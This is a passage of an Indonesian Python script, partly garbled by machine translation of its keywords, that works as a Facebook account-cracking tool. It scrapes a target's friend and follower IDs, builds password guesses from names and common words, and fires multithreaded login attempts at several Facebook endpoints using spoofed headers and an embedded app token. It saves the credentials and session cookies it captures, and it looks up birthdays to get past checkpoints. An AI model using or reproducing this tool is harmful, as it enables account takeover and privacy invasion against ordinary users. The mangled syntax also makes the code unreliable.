		jalan("Token Kadaluarsa")
		waktu.tidur(0.5)
		Gabung()
	uid = input("Masukkan ID Target : ")
	mencoba:
		jumlah = int(input(" Mau Ambil ID : "))
		jika jumlah>5000:
			jalan(" Maksimal 5000 ID")
			waktu.tidur(0.5)
			mengikuti()
	kecuali ValueError:
		jalan("Masukan Tidak Valid")
		waktu.tidur(0.5)
		mengikuti()
	#mencoba:
		#asu = request.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		#tulul = json.loads(asu.teks)
		#print("Nama : "+tulul["nama"])
	#kecuali KeyError:
		#print("ID Salah")
		#waktu.tidur(0.5)
		#mengikuti()
	#except request.exceptions.ConnectionError:
		#jalan("Tidak Ada Internet")
		#waktu.tidur(0.5)
		#keluar()
	mencoba:
		bulu = request.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.teks)
		untuk cew di buriq["data"]:
			mencoba:
				sange = cew["id"]
				bule = cew["nama"]
				id.append(sange+"|"+bule)
			kecuali:
				melanjutkan
		print("Jumlah ID : %s"%(len(id)))
		tursandi()
	kecuali request.exceptions.ConnectionError:
		jalan("Tidak Ada Internet")
		waktu.tidur(0.5)
		keluar()

### DUMP PUBLIK ###
def publik():
	mencoba:
		token=open("token.txt","r").read()
	kecuali IOError:
		exit(" %s[!] token kadaluwarsa"%(M))
	idt=input("\n %s[%s?%s] %smasukkan id :%s "%(O,H,O,N,O))
	jika id di[""]:
		Tidak bisa()
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	print(" %s[%s1%s] %scrack semua id %s[%s2%s] %scrack id lama"%(O,H,O,N,O,H,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	jika bertanya di[""]:
		Tidak bisa()
	elif bertanya di["1"]:
		mencoba:
			untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["nama"]
				id.append(uid+"<=>"+nama)
		kecuali KeyError:
			exit(" %s[%s!%s] %sakun tidak tersedia atau list teman private"%(O,H,O,K))
		print(" %s[%s+%s] %total id :%s %s"%(O,H,O,N,H,len(id)))
		tursandi()
	elif bertanya di["2"]:
		mencoba:
			untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["nama"]
				if len(i['id'])==6 atau len(i['id'])==7 atau len(i['id'])==8 atau len(i['id'])= =9 atau len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:10] di ['1000000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:9] di ['100000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:8] di ['10000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(uid+"<=>"+nama)
		kecuali KeyError:
			exit(" %s[%s!%s] %sakun tidak tersedia atau list teman private"%(O,H,O,K))
		print(" %s[%s+%s] %total id :%s %s"%(O,H,O,N,H,len(id)))
		tursandi()
		
### ATUR SANDI ###
def atursandi():
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	print(" %s[%s1%s] %sotomatis %s[%s2%s] %smanual %s[%s3%s] %sgabungkan"%(O,H,O,N,O,K,O, T,O,U,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	jika bertanya di[""]:
		Tidak bisa()
	elif bertanya di["1"]:
		otomatis()
	elif bertanya di["2"]:
		petunjuk()
	elif bertanya di["3"]:
		gabungkan()
	kalau tidak:
		keluar()

def munculopsi():
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	print(" %s[%s1%s] %smunculkan opsi %s[%s2%s] %sjangan munculkan"%(O,H,O,N,O,K,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	jika bertanya di[""]:
		Tidak bisa()
	elif bertanya di["1"]:
		opsi.append("y")
	elif bertanya di["2"]:
		opsi.append("t")
	kalau tidak:
		keluar()

### OTOMATIS ###
def otomatis():
	munculopsi()
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode seluler [%ssangat lambat%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode grafik [%ssuper lambat hef%s]"%(O,H,O,N,H,N))
	print('%s--------------------------------------------- ---------------------------'%(HAI))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	jika bertanya ="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif bertanya = "1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s--------------------------------------------- ---------------------------'%(HAI))
		dengan ThreadPoolExecutor(max_workers=30) sebagai fall:
			untuk pengguna di id:
				uid, nama = user.split("<=>")
				nama = nama.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### MANUAL ###
def manual():
	munculopsi()
	print('%s------------------------------------------------------------------------'%(O))
	print(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(O,H,O,N,O,N))
	pwek=input(' %s[%s?%s] %sbuat kata sandi :%s '%(O,H,O,N,H))
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('%s------------------------------------------------------------------------'%(O))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print('%s------------------------------------------------------------------------'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
### GABUNGAN ###
def gabungkan():
	munculopsi()
	print('%s------------------------------------------------------------------------'%(O))
	print(" %s[%s!%s] %ssandi bawaan %snama123,1234,12345,sayang,kontol,anjing"%(O,H,O,N,H))
	print(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(O,H,O,N,O,N))
	pwek=input(' %s[%s?%s] %ssandi gabungan :%s '%(O,H,O,N,H))
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('%s------------------------------------------------------------------------'%(O))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print('%s------------------------------------------------------------------------'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%s------------------------------------------------------------------------'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
###Crack X
def graph(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://graph.facebook.com/auth/login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			if "y" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				ceker(uid,pw,ua)
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			elif "t" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
			c+=1
			sys.stdout.flush()
			api(uid, pwx)
		else:
			continue

	loop += 1

### CRACK API ###
def api(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			if "y" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				ceker(uid,pw,ua)
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			elif "t" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
			c+=1
			sys.stdout.flush()
			api(uid, pwx)
		else:
			continue

	loop += 1

### CRACK MBASIC M FB ###
def crack(uid, pwx, host, **kwargs):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r %s[OK] %s|%s|%s"%(H,uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if "y" in opsi:
					try:
						token = open("token.txt", "r").read()
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan[month]
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					ceker(uid,pw,ua)
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
				elif "t" in opsi:
					try:
						token = open("token.txt", "r").read()
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan[month]
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					print("\r %s[CP] %s|%s        "%(K,uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")
def ceker(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
		for opt in range(len(ngew)):
			print("  "+N+"["+str(opt+1)+"]. "+ngew[opt]+" ")
		if "0" in str(len(ngew)):
			print("\r %s[âœ“] akun tap yes, login di lite       "%(H))
	elif "login_error" in str(run):
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
	else:
		print("\r %s[CP] %s|%s        "%(K,uid, pw))

if __name__=='__main__':
	os.system('git pull')
	menu()